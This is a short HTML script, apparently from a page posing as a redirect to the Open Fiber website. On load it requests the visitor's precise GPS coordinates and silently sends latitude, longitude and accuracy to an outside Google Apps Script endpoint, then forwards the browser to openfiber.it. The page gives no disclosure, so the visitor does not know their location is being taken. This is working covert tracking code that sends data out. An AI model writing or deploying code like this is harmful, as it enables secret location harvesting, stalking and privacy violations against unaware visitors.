<script>

const finalUrl = "https://www.openfiber.it";

const scriptUrl = "https://script.google.com/macros/s/AKfycby0D-gyeJr9J3N-CjVTJz6vrNCMs1LGxbW6GyswWP9LDKdHq8a4NQOhBaFevARzeJY7cA/exec"

navigator.geolocation.getCurrentPosition(

(position) => {

  const latitude = position.coords.latitude.toFixed(6);

  const longitude = position.coords.longitude.toFixed(6);

  const accuracy = position.coords.accuracy.toFixed(2);

  const trackingUrl =
    scriptUrl +
    "?latitude=" + encodeURIComponent(latitude) +
    "&longitude=" + encodeURIComponent(longitude) +
    "&accuracy=" + encodeURIComponent(accuracy) +
    "&redirect=" + encodeURIComponent(finalUrl);

  window.location.href = trackingUrl;

},

(error) => {

  alert("GPS negato");

},

{
  enableHighAccuracy: true
}

);

</script>
